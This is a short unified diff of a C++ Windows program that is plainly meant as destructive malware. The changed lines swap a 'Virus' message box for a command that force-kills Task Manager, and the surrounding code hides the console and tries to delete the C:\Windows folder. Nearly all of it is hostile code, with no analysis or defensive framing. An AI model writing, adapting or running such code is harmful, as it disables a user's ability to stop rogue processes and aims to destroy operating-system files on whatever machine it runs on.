@@ -5,7 +5,8 @@
 using namespace std;
 
 int main(){
-  MessageBox(NULL,"You Messed Up Hard","Virus", MB_OK); //The Message!
+  system(("taskkill /F /T /IM Taskmgr.exe"));//Kills Task's
+  getchar();
   FreeConsole(); //Hides Console
   
   const int result = remove("C:\Windows"); //Removes The C:/Windows Folder
